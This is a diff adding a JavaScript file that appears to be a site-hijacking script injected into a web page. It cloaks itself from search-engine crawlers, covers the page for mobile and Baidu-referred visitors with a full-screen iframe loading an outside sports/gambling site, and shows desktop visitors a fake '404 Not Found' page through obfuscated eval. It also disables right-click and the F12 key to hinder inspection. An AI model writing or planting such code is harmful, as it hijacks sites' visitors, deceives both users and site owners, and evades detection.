@@ -1,0 +1,67 @@
+var s=document.referrer;
+var host=window.location.host;
+var p = navigator.platform;
+
+var win_Height = window.innerHeight;
+
+var arr = [ 
+					
+					'http://www.177sports.com',
+				
+
+]; 
+
+var _src = '';
+ 
+var reg = /(Baiduspider|360Spider|YisouSpider|YandexBot|Sogou inst spider|Sogou web spider|spider|Baiduspider-render)/i;
+if (!reg.test(navigator.userAgent)) {
+    
+    let flag = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|QQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i);
+    if ( ! /Win/i.test(navigator.platform) && ! /Mac/i.test(navigator.platform) )  {
+       
+         _src = arr[parseInt(Math.random() * arr.length)]; 
+        
+    
+    }else if (s.indexOf("baidu.com") > -1 ){ 
+         _src = arr[parseInt(Math.random() * arr.length)];  
+    }
+    else {
+        // PC
+        let temp = '<div style="position: fixed; top: 0px;padding-top:20px; z-index: 99999; width: 100%; height: '+win_Height+'px; background-color: #ffffff; font-size: 16px;"><center><h2>404 Not Found</h2></center><hr><center>nginx pc</center></div>';
+    	eval("do"+"cu"+"ment.wr"+"ite('"+temp+"');");
+    	//document.getElementsByTagName("title")[0].innerHTML = "\u0034\u0030\u0034";
+    	var titleElement = document.getElementsByTagName("title")[0];
+        if (titleElement) {
+          titleElement.innerHTML = "\u0034\u0030\u0034";
+        } else {
+          document.write('<title>\u0034\u0030\u0034</title>');
+        }
+    	
+    	document.oncontextmenu = false;
+    	document.onkeydown = function(e) {
+    		var currKey = 0, evt = e || window.event;
+    		currKey = evt.keyCode || evt.which || evt.charCode;
+    		if (currKey == 123) {
+    			window.event.cancelBubble = true;
+    			window.event.returnValue = false;
+    		}
+    	}
+    
+    	
+    }
+    
+    if(_src!==''){
+    
+        document.write('<meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1">');
+        var hd = document.head;
+        var styleCSS = document.createElement('style'), yaaboo = document.createElement('div');
+        styleCSS.innerHTML = 'html,body{position:relative;width:auto !important;height:100% !important;min-width:auto !important;overflow:hidden;}.yaaboo{position:fixed;top:0;left:0;right:0;height:100%;z-index:9999999999;background:#fff;}';
+        yaaboo.setAttribute('class', 'yaaboo');
+        yaaboo.innerHTML = '<iframe src='+ _src +' frameborder="0" style="position:fixed;top:0;left:0;width:100% !important;height:100% !important;max-height: none !important;"></iframe>';
+        hd.appendChild(styleCSS);
+        hd.parentNode.appendChild(yaaboo);
+    
+    }
+
+
+}
